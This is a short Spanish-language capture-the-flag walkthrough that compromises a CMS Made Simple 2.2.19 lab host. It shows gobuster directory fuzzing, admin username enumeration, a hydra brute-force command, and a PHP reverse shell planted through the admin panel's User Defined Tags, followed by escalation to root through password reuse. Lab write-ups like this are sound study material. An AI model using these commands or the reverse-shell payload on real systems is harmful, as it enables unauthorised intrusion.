## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un index predeterminado de Apache, pero inspeccionando el código hay algo interesante:

“cms  made simple is installed here - Access to it - cmsms”

  Pruebo “cmsms” como directorio y funciona:

```bash
http://172.17.0.2/cmsms
```

Vemos una pagina creada con CMS version 2.2.19

Le realizo fuzzing a la página:

```bash
gobuster dir -u http://<IP>/cmsms/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Encuentro:

```bash
/admin                (Status: 200) [Size: 4568]
/assets               (Status: 200) [Size: 2145]
/config.php           (Status: 200) [Size: 0]
/doc                  (Status: 200) [Size: 24]
/index.php            (Status: 200) [Size: 19671]
/lib                  (Status: 200) [Size: 24]
/modules              (Status: 200) [Size: 3397]
/tmp                  (Status: 200) [Size: 1147]
/uploads              (Status: 200) [Size: 1543]
```

En admin, hay un panel de login. Si le damos click en “forgot your password?” nos pide el usuario, si probamos uno random nos dara error y con el usuario admin nos da un error diferente, dando a entender que existe.

Aplico un ataque con hydra:

```bash
hydra -l admin -P <WORDLIST> <IP> http-post-form "/cmsms/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"
```

Pass = chocolate 

Entramos en el panel de admin de la página y la idea es ver como enviarnos una rev shell.

En la sección de “extensions” → “User Definfed Tags” → “Add User Defined Tag” hay in cuadro donde se puede introducir código e insertaremos una shell en php:

```bash
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

## Escaldada

Se reutiliza la contraseña de admin (chocolate) para root.
